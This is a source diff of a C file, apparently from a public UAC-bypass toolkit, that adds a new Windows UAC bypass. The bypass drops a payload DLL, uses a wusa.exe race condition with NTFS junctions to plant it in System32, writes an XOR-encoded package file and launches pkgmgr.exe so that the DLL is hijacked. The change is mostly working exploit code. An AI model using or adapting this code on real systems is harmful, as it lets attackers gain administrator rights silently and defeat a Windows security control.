@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.19
+*  VERSION:     3.20
 *
-*  DATE:        22 May 2019
+*  DATE:        22 Oct 2019
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1767,7 +1767,7 @@ NTSTATUS ucmUiAccessMethod(
 }
 
 /*
-* ucmJunctionMethod
+* ucmJunctionMethodPreNetfx48
 *
 * Purpose:
 *
@@ -1779,7 +1779,7 @@ NTSTATUS ucmUiAccessMethod(
 * Wusa race condition in combination with junctions found by Thomas Vanhoutte.
 *
 */
-NTSTATUS ucmJunctionMethod(
+NTSTATUS ucmJunctionMethodPreNetfx48(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
@@ -1795,7 +1795,6 @@ NTSTATUS ucmJunctionMethod(
 
     WCHAR szBuffer[MAX_PATH * 2];
     WCHAR szSource[MAX_PATH * 2];
-
     do {
 
         //
@@ -1893,10 +1892,105 @@ NTSTATUS ucmJunctionMethod(
         if (supRunProcess(szBuffer, NULL))
             MethodResult = STATUS_SUCCESS;
 
+
     } while (FALSE);
 
     if (hKey != NULL)
         RegCloseKey(hKey);
+
+    if (bWusaNeedCleanup) {
+
+        //
+        // Remove cabinet file if exist.
+        //
+        ucmWusaCabinetCleanup();
+    }
+
+    return MethodResult;
+}
+
+/*
+* ucmJunctionMethod
+*
+* Purpose:
+*
+* Bypass UAC using two different steps:
+*
+* 1) Create wusa.exe race condition and force wusa to copy files to the protected directory using NTFS reparse point.
+* 2) Depending on Netfx available version hijack pkgmgr.exe using dll search order abuse or hijack dotnet dependencies for dcomcnfg.exe
+*
+* Wusa race condition in combination with junctions found by Thomas Vanhoutte.
+*
+*/
+NTSTATUS ucmJunctionMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    BOOL bWusaNeedCleanup = FALSE;
+
+    LPWSTR lpEnd = NULL;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+    WCHAR szParams[MAX_PATH];
+
+    if (supIsNetfx48PlusInstalled() == FALSE)
+        return ucmJunctionMethodPreNetfx48(ProxyDll, ProxyDllSize);
+
+    do {
+
+        //
+        // Drop payload dll to %temp% and make cab for it.
+        //
+        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
+        _strcat(szBuffer, DISMCORE_DLL);
+
+        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(szBuffer, ProxyDll, ProxyDllSize, NULL);
+        if (!bWusaNeedCleanup)
+            break;
+
+        _strcpy(szBuffer, g_ctx->szSystemDirectory);
+
+        lpEnd = _strend(szBuffer);
+        if (*(lpEnd - 1) == TEXT('\\'))
+            *(lpEnd - 1) = TEXT('\0');
+
+        if (!ucmWusaExtractViaJunction(szBuffer))
+            break;
+
+        Sleep(2000);
+
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
+        _strcat(szBuffer, PACKAGE_XML);
+
+        //
+        // Write package data to disk.
+        //
+        if (!supDecodeAndWriteBufferToFile(szBuffer,
+            (CONST PVOID)&g_encodedPackageData,
+            sizeof(g_encodedPackageData),
+            AKAGI_XOR_KEY2))
+        {
+            break;
+        }
+
+        //
+        // Run target.
+        //
+        _strcpy(szBuffer, g_ctx->szSystemDirectory);
+        _strcat(szBuffer, PKGMGR_EXE);
+
+        _strcpy(szParams, TEXT("/n:"));
+        _strcat(szParams, g_ctx->szTempDirectory);
+        _strcat(szParams, PACKAGE_XML);
+
+        if (supRunProcess(szBuffer, szParams))
+            MethodResult = STATUS_SUCCESS;
+
+    } while (FALSE);
+
 
     if (bWusaNeedCleanup) {
 
@@ -1931,6 +2025,10 @@ BOOL ucmJunctionMethodCleanup(
     DWORD i, cValues = 0, cbMaxValueNameLen = 0, bytesIO;
 
     WCHAR szBuffer[MAX_PATH * 2];
+
+    if (supIsNetfx48PlusInstalled()) {
+        return ucmMethodCleanupSingleItemSystem32(DISMCORE_DLL);
+    }
 
     do {
 
@@ -3462,6 +3560,8 @@ NTSTATUS ucmAcCplAdminMethod(
 *
 * This code expects to work under wow64 only because of uacme restrictions.
 * However you can extent it to force drop your *32* bit dll from your *64* bit application.
+*
+* Fixed in Windows 10 19H1
 *
 */
 NTSTATUS ucmEgre55Method(
